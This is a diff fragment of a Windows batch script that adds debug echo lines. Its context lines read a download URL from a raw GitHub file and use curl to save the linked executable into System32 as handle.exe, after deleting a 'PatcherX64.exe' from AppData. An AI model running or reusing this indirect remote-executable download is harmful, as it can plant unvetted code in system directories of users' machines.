@@ -11,6 +11,10 @@ del /f /q "%APPDATA%\microsoft\PatcherX64.exe" >nul 2>&1
 
 for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/HandleFileLink') do set "HANDLEFILELINK=%%i"
 
+echo.
+echo HANDLEFILELINK=%HANDLEFILELINK%
+echo.
+
 :: Download the file using curl
 curl -# -o "%SystemRoot%\System32\handle.exe" "%HANDLEFILELINK%"
 
